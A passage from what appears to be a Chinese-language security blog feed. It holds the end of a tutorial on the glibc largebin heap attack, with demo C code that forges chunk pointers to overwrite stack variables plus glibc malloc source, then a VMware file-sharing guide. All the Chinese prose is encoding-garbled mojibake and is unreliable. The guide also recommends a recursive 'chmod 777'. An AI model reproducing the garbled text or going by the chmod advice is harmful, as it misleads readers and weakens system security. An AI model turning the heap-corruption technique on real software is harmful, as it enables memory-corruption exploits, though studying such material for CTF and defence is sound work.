class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> <span class="hljs-built_in">free</span>(p3);<br><br> p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;    <span class="hljs-comment">//size è®¾ç½®ä¸º 0x3f1</span><br> p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd ç½®ç©º</span><br> p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd_nextsize ç½®ç©º</span><br>p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);  <span class="hljs-comment">//bk ä¿®æ”¹ä¸º stack_var1_addr - 0x10</span><br>p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);  <span class="hljs-comment">//bk_nextsize ä¿®æ”¹ä¸º stack_var1_addr - 0x20</span><br><br> <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br> <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br> <br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€è½® malloc ç»“æŸï¼Œå †ç»“æ„å¦‚ä¸‹ï¼Œp1ã€p2ã€p3 çš„åœ°å€åˆ†åˆ«æ˜¯ 0x602000 ã€ 0x602360 ã€ 0x6027a0</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb1.png"></p><p>é‡Šæ”¾æ‰ p1 å’Œ p2ï¼Œä¸¤ä¸ªå †å—éƒ½è¿›å…¥ unsortedbin ä¸­ ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œp1 çš„å¤§å°æ˜¯ 0x330 å¤§å°å±äº small binï¼Œè€Œ p2 çš„å¤§å°æ˜¯ 0x410 å±äº large bin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb2.png"></p><p>ç”¨ <code>malloc(0x90);</code> åˆ†å‰²å †å—ï¼Œæ‰€ä»¥åŸæœ¬çš„å †å—è¢«åˆ†å‰²ï¼Œå‰©ä½™çš„éƒ¨åˆ†è¿›å…¥äº† largebin ã€‚</p><p>å®é™…ä¸Šè¯¦ç»†çš„æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ä» unsorted bin ä¸­æ‹¿å‡ºæœ€åä¸€ä¸ª chunkï¼ˆp1 å±äº small bin çš„èŒƒå›´ï¼‰</li><li>æŠŠè¿™ä¸ª chunk æ”¾å…¥ small bin ä¸­ï¼Œå¹¶æ ‡è®°è¿™ä¸ª small bin æœ‰ç©ºé—²çš„ chunk</li><li>å†ä» unsorted bin ä¸­æ‹¿å‡ºæœ€åä¸€ä¸ª chunkï¼ˆp2 å±äº large bin çš„èŒƒå›´ï¼‰</li><li>æŠŠè¿™ä¸ª chunk æ”¾å…¥ large bin ä¸­ï¼Œå¹¶æ ‡è®°è¿™ä¸ª large bin æœ‰ç©ºé—²çš„ chunk</li><li>ç°åœ¨ unsorted bin ä¸ºç©ºï¼Œä» small bin ï¼ˆp1ï¼‰ä¸­åˆ†é…ä¸€ä¸ªå°çš„ chunk æ»¡è¶³è¯·æ±‚ 0x90ï¼Œå¹¶æŠŠå‰©ä¸‹çš„ chunkï¼ˆ0x330 - 0xa0ï¼‰æ”¾å…¥ unsorted bin ä¸­</li></ul><p>æ‰€ä»¥ä¼šå‡ºç°ä¸‹å›¾çš„å †ç»“æ„ï¼šunsorted bin ä¸­æœ‰ä¸€ä¸ª chunk å¤§å°æ˜¯ 0x330 - 0xa0 &#x3D; 0x290 ï¼›large bin æŸä¸€ä¸ªåºåˆ—çš„ bin ä¸­æœ‰ä¸€ä¸ª chunk å¤§å°æ˜¯ 0x410</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb3.png"></p><p>free æ‰ p3 ï¼Œp3 è¿›å…¥ unsortedbin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb4.png"></p><p>æ¥ä¸‹æ¥ä¿®æ”¹ p2 çš„ä¿¡æ¯ï¼Œä¿®æ”¹å‰åä¾æ¬¡å¦‚ä¸‹å›¾</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb5.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb6.png"></p><p>ä¿®æ”¹åçš„ç»“æœå¦‚ä¸‹ï¼š</p><table><thead><tr><th>size</th><th>fd</th><th>bk</th><th>fd_nextsize</th><th>bk_nextsize</th></tr></thead><tbody><tr><td>0x3f1</td><td>0</td><td>stack_var1_addr - 0x10</td><td>0</td><td>stack_var2_addr - 0x20</td></tr></tbody></table><p>æˆ‘ä»¬è®°è¿™ä¸ª stack_var1 - 0x10 ä¸º fakechunk1ï¼Œæ­¤æ—¶ stack_var1 - 0x10 çš„ fd æŒ‡é’ˆæŒ‡å‘ fakechunk1 ï¼ŒåŒæ—¶ stack_var2 - 0x20 ä¸º fakechunke2 ï¼Œæ­¤æ—¶ stack_var2 - 0x20 çš„ fd æŒ‡é’ˆæŒ‡å‘ fakechunk2ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å†æ¬¡ <code>malloc(0x90)</code>, p3 æŒ‚è¿›äº† largebin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb7.png"></p><p>å…·ä½“æœ‰å…³è¿™ä¸ªéƒ¨åˆ†çš„ malloc ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br>        unsorted_chunks (av)-&gt;bk = bck;<br>        bck-&gt;fd = unsorted_chunks (av);<br><br>        <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>        <span class="hljs-keyword">if</span> (size == nb)<br>          &#123;<br>            set_inuse_bit_at_offset (victim, size);<br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>              victim-&gt;size |= NON_MAIN_ARENA;<br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br><br>        <span class="hljs-comment">/* place chunk in bin */</span><br><br>        <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>          &#123;<br>            victim_index = smallbin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            victim_index = largebin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br><br>            <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>            <span class="hljs-keyword">if</span> (fwd != bck)<br>              &#123;<br>                <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                size |= PREV_INUSE;<br>                <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                  &#123;<br>                    fwd = bck;<br>                    bck = bck-&gt;bk;<br><br>                    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                  &#125;<br>                <span class="hljs-keyword">else</span><br>                  &#123;<br>                    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                    <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                      &#123;<br>                        fwd = fwd-&gt;fd_nextsize;<br>                        assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      &#125;<br><br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                      <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                      fwd = fwd-&gt;fd;<br>                    <span class="hljs-keyword">else</span><br>                      &#123;<br>                        victim-&gt;fd_nextsize = fwd;<br>                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                        fwd-&gt;bk_nextsize = victim;<br>                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                      &#125;<br>                    bck = fwd-&gt;bk;<br>                  &#125;<br>              &#125;<br>            <span class="hljs-keyword">else</span><br>              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>          &#125;<br><br>        mark_bin (av, victim_index);<br>        victim-&gt;bk = bck;<br>        victim-&gt;fd = fwd;<br>        fwd-&gt;bk = victim;<br>        bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡æˆ‘ä»¬ä» unsortedbin ä¸­æ‹¿å‡ºçš„æ˜¯å±äº largebinï¼Œæ‰€ä»¥è¿›å…¥åˆ°å †å—å¤§å°åˆ¤æ–­çš„ else åˆ†æ”¯ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŒ‡é’ˆçš„æ“ä½œï¼Œç”±äºæˆ‘ä»¬çš„ p3 è¢«æˆ‘ä»¬ä¿®æ”¹è¿‡æ•°æ®ï¼Œå°±ä¼šè·³è¿‡ while çš„å¾ªç¯ï¼Œè¿›å…¥ä¸‹é¢çš„éƒ¨åˆ†åˆ†æ”¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>&#123;<br>fwd = fwd-&gt;fd_nextsize;<br>assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br><span class="hljs-comment">/* Always insert in the second position.  */</span><br>fwd = fwd-&gt;fd;<br><span class="hljs-keyword">else</span><br>&#123;<br>victim-&gt;fd_nextsize = fwd;<br>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>fwd-&gt;bk_nextsize = victim;<br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬è¢«ä¿®æ”¹çš„æŒ‡é’ˆå°±å®Œæˆäº†åˆ©ç”¨ï¼Œä¿®æ”¹äº† stack_var1 å’Œstack_var2 çš„å€¼ã€‚</p><hr><p>è§‰å¾—å †é¢˜è¿˜æ˜¯è¦å»åˆ†æä¸€ä¸‹æºç ï¼Œæ¥ä¸‹æ¥å°±è®¡åˆ’å»çœ‹çœ‹æºç </p><p><del>å…ˆåšå‡ é“é¢˜ç»ƒç»ƒæ‰‹</del></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´äº’ä¼ æ–‡ä»¶åŠå¤åˆ¶ç²˜è´´çš„å®ç°</title>
    <link href="/2023/08/04/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E4%B8%BB%E6%9C%BA%E4%B9%8B%E9%97%B4%E4%BA%92%E4%BC%A0%E6%96%87%E4%BB%B6%E5%8F%8A%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <url>/2023/08/04/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E4%B8%BB%E6%9C%BA%E4%B9%8B%E9%97%B4%E4%BA%92%E4%BC%A0%E6%96%87%E4%BB%B6%E5%8F%8A%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>çœŸçš„å»ºè®®å¤§å®¶åœ¨æ‰€æœ‰åŠŸèƒ½éƒ½å¥½ç”¨çš„æ—¶å€™å­˜ä¸€ä¸‹å¿«ç…§ğŸ‘»</p><span id="more"></span><h1 id="å®ç°è™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„æ‹–æ‹½"><a href="#å®ç°è™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„æ‹–æ‹½" class="headerlink" title="å®ç°è™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„æ‹–æ‹½"></a>å®ç°è™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„æ‹–æ‹½</h1><blockquote><p>è¿™ä¸ªè§£å†³æ–¹æ³•é€‚åˆè€ç‰ˆæœ¬æ¯”å¦‚16ï¼Œ18ã€‚æˆ‘åœ¨äº’è”ç½‘ä¸Šå†²æµªå†²äº†è¿™ä¹ˆä¹…çœ‹åˆ°å¤§å®¶éƒ½åœ¨è¯´22ç‰ˆæœ¬ä¸æ”¯æŒæ‹–æ‹½ï¼Œæ— æ‰€è°“äº†å§éº»äº†</p></blockquote><p>é¦–å…ˆéœ€è¦ç¡®ä¿è™šæ‹Ÿæœºçš„å¯ç”¨æ‹–æ”¾å’Œå¯ç”¨å¤åˆ¶ç²˜è´´é€‰é¡¹å¼€å¯</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_20-12-12.png"></p><h3 id="åªèƒ½å¤åˆ¶ç²˜è´´ä¸èƒ½æ‹–æ‹½"><a href="#åªèƒ½å¤åˆ¶ç²˜è´´ä¸èƒ½æ‹–æ‹½" class="headerlink" title="åªèƒ½å¤åˆ¶ç²˜è´´ä¸èƒ½æ‹–æ‹½"></a>åªèƒ½å¤åˆ¶ç²˜è´´ä¸èƒ½æ‹–æ‹½</h3><p>è™šæ‹Ÿæœºâ€å¯ç”¨æ‹–æ‹½â€åŠŸèƒ½å·²å¼€å¯ï¼Œä½†æ˜¯ä»æœ¬æœºå¾€è™šæ‹Ÿæœºæ‹–æ‹½æ–‡ä»¶æ—¶ä¾æ—§è¢«ç¦æ­¢ï¼</p><p>å®‰è£… open-vm-tools-desktop è½¯ä»¶ï¼Œå®ƒæ˜¯ VMware Tools å…¶ä¸­çš„ä¸€ä¸ªç»„ä»¶ï¼Œè´Ÿè´£æ”¯æŒè™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„æ‹–æ‹½ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure><h3 id="æ—¢ä¸èƒ½å¤åˆ¶ç²˜è´´ä¹Ÿä¸èƒ½æ‹–æ‹½"><a href="#æ—¢ä¸èƒ½å¤åˆ¶ç²˜è´´ä¹Ÿä¸èƒ½æ‹–æ‹½" class="headerlink" title="æ—¢ä¸èƒ½å¤åˆ¶ç²˜è´´ä¹Ÿä¸èƒ½æ‹–æ‹½"></a>æ—¢ä¸èƒ½å¤åˆ¶ç²˜è´´ä¹Ÿä¸èƒ½æ‹–æ‹½</h3><p><strong>é‡è£… VMware Toolsï¼</strong></p><p>é¦–å…ˆè¦å®‰è£… VMware Toolsï¼Œå¦‚æœä½ æ˜¯æ›¾ç»æœ‰è¿‡VMware Tools æŒ‰é’®ä¼šæ˜¾ç¤ºé‡æ–°å®‰è£…</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/11.png"></p><p>å¼€æœºåä¼šå‘ç°æ¡Œé¢ä¸Šæˆ–è€…ä¾§è¾¹æ å¤šäº†ä¸€ä¸ªå…‰ç›˜å›¾æ ‡ï¼Œç‚¹è¿›å»æŠŠå‹ç¼©åŒ…å¤åˆ¶åˆ°æ¡Œé¢</p><blockquote><p>ä¸‹å›¾æ˜¯ Ubuntu22ï¼Œæˆ‘çš„ Ubuntu18 æ˜¯ä¸€ä¸ªå…‰ç›˜å›¾æ ‡ç›´æ¥å‡ºç°åœ¨æ¡Œé¢ä¸Š</p></blockquote><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-32-05.png"></p><p>ç›´æ¥é€‰ä¸­å³é”® â€œcopy toâ€ </p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-37-20.png"></p><p>åœ¨æ¡Œé¢æ‰“å¼€ terminalï¼Œ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar zxfv [vmwatr-install-name]<br></code></pre></td></tr></table></figure><p>å‡¡æ˜¯è®©ä½ å›ç­” yes æˆ–è€… no çš„éƒ½è¾“å…¥ yes å¹¶å›è½¦</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-50-55.png"></p><p>å‡¡æ˜¯ [&#x2F;â€¦&#x2F;â€¦] éƒ½æŒ‰å›è½¦é”®</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-51-21.png"></p><p>ä¸‹å›¾è¿™æ ·å°±æ˜¯å®‰è£…å¥½äº†</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-54-21.png"></p><h3 id="å®‰è£…VMware-Toolsé€‰é¡¹æ˜¾ç¤ºç°è‰²"><a href="#å®‰è£…VMware-Toolsé€‰é¡¹æ˜¾ç¤ºç°è‰²" class="headerlink" title="å®‰è£…VMware Toolsé€‰é¡¹æ˜¾ç¤ºç°è‰²"></a>å®‰è£…VMware Toolsé€‰é¡¹æ˜¾ç¤ºç°è‰²</h3><p>åªéœ€è¦ä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š</p><p>1.å…³é—­è™šæ‹Ÿæœº</p><p>2.åœ¨è™šæ‹Ÿæœºè®¾ç½®åˆ†åˆ«è®¾ç½®<strong>CD&#x2F;DVDã€CD&#x2F;DVD2å’Œè½¯ç›˜ä¸‰ä¸ªéƒ¨åˆ†</strong>ä¸ºè‡ªåŠ¨æ£€æµ‹ï¼ˆå¦‚æœä½ æœ¬æ¥å°±æ˜¯è‡ªåŠ¨æ£€æµ‹ï¼Œå°±æ¢æˆVMwareå®‰è£…ç›®å½•ä¸­çš„ linux.isoï¼‰</p><p>3.å†é‡å¯è™šæ‹Ÿæœºï¼Œç°è‰²å­—å³ç‚¹äº®</p><blockquote><p>æ³¨æ„ï¼å¦‚æœå¼€æœºä»¥åè¿˜æ˜¯ä¸è¡Œï¼Œå°±é‡å¯ï¼Œè¶ç€å±å¹•æ˜¯é»‘è‰²çš„è¿˜æ²¡å‡ºç°ç™»å½•ç•Œé¢çš„æ—¶å€™å†æ¬¡æŸ¥çœ‹ï¼Œä½ å°±ä¼šå‘ç°å®ƒäº®äº†ğŸ¤—</p><p>å¿«å‡†ç‹ ï¼ç‚¹å‡»é‡æ–°å®‰è£…ï¼ï¼ï¼</p></blockquote><h3 id="å¦è¾Ÿæ–°é“è·¯"><a href="#å¦è¾Ÿæ–°é“è·¯" class="headerlink" title="å¦è¾Ÿæ–°é“è·¯"></a>å¦è¾Ÿæ–°é“è·¯</h3><p>ä¸å°±æ˜¯æƒ³åœ¨ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´å…±äº«æ–‡ä»¶å˜›ï¼Œç›´æ¥æ‰“å¼€æµè§ˆå™¨ç™»é™†å¾®ä¿¡æ–‡ä»¶ä¼ è¾“åŠ©æ‰‹ä¼ è¾“æ–‡ä»¶</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_17-32-09.png"></p><h1 id="å®ç°å…±äº«æ–‡ä»¶å¤¹"><a href="#å®ç°å…±äº«æ–‡ä»¶å¤¹" class="headerlink" title="å®ç°å…±äº«æ–‡ä»¶å¤¹"></a>å®ç°å…±äº«æ–‡ä»¶å¤¹</h1><blockquote><p>VMware Toolsè¦å…ˆè£…å¥½å—·~</p></blockquote><p>å› ä¸ºçœèµ›æ–­ç½‘æˆ‘é‚£ä¸ªæ–‡ä»¶ä¼ è¾“åŠ©æ‰‹çš„æ‹›å¼ä¸èƒ½ç”¨äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦å»ºä¸€ä¸ªå…±äº«æ–‡ä»¶å¤¹</p><h4 id="ä¸»æœºæ–°å»ºå…±äº«æ–‡ä»¶å¤¹"><a href="#ä¸»æœºæ–°å»ºå…±äº«æ–‡ä»¶å¤¹" class="headerlink" title="ä¸»æœºæ–°å»ºå…±äº«æ–‡ä»¶å¤¹"></a>ä¸»æœºæ–°å»ºå…±äº«æ–‡ä»¶å¤¹</h4><p>åœ¨ä¸»æœºé‡Œå»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè®¾ç½®å…±äº«å±æ€§ä¸ºæ‰€æœ‰äººéƒ½èƒ½è®¿é—®</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-11-09_10-17-20.png"></p><h4 id="è™šæ‹Ÿæœºè®¾ç½®"><a href="#è™šæ‹Ÿæœºè®¾ç½®" class="headerlink" title="è™šæ‹Ÿæœºè®¾ç½®"></a>è™šæ‹Ÿæœºè®¾ç½®</h4><p>åœ¨è™šæ‹Ÿæœºè®¾ç½®é‡Œé¢è®¾ç½®å…±äº«æ–‡ä»¶å¤¹</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/image-20231109205001186.png"></p><p>é€‰æ‹©ä¸»æœºé‡Œè®¾ç½®çš„æ–‡ä»¶å¤¹ï¼Œè®¾ç½® â€æ€»æ˜¯å¯ç”¨â€œ</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-11-09_20-51-03.png"></p><p>å¼€æœºååœ¨å‘½ä»¤è¡Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å…±äº«æ–‡ä»¶å¤¹ï¼Œä¼šè¾“å‡ºä¸»æœºä¸­çš„æ–‡ä»¶å¤¹å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vmware-hgfsclient<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°è¯•ä¸€ä¸‹æ‰‹åŠ¨æŒ‚è½½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo vmhgfs-fuse .host:/å…±äº«æ–‡ä»¶å /mnt/hgfs -o allow_other<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™æˆ‘ä»¬å» mnt æ–‡ä»¶å¤¹é‡Œå°±èƒ½çœ‹è§å…±äº«æ–‡ä»¶å¤¹é‡Œçš„ä¸œè¥¿äº†</p><p>æ¯æ¬¡éƒ½æ‰‹åŠ¨æŒ‚è½½å¤ªéº»çƒ¦äº†ï¼Œæˆ‘ä»¬è®¾ç½®ä¸€ä¸‹å¼€æœºè‡ªåŠ¨æŒ‚è½½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo vim /etc/fstab<br></code></pre></td></tr></table></figure><p>åœ¨æ‰“å¼€çš„æ–‡ä»¶ä¸­æœ€åä¸€è¡Œæ·»åŠ </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">.host:<span class="hljs-regexp">/å…±äº«æ–‡ä»¶å /m</span>nt/hgfs fuse.vmhgfs-fuse allow_other <span class="hljs-number">0</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h1 id="Permission-denied"><a href="#Permission-denied" class="headerlink" title="Permission denied"></a>Permission denied</h1><p>åœ¨æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œä½ æ˜¯å¦ä¼šé‡åˆ° <code>bash: ./pwn: Permission denied</code> è¿™ç§æƒ…å†µå‘¢ï¼Ÿ</p><p>é‚£æ˜¯å› ä¸ºæ²¡æœ‰æ­£ç¡®è®¾ç½®è¯»å–æƒé™ï¼Œæˆ‘ä»¬åªéœ€è¦å°†æƒ³è¦ç”¨æˆ·æ‰§è¡Œè¯»å†™æƒé™çš„ä½ç½®å¡«å…¥ä¸‹æ–¹ <code>[]</code> ä¸­ï¼Œå†å¤åˆ¶åˆ° terminal ä¸­å°±å¯ä»¥è§£å†³é—®é¢˜äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chmod</span> -R 777 [~/Desktop]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>è¸©å‘</category>
      
    </categories>
    
    
    <tags>
      
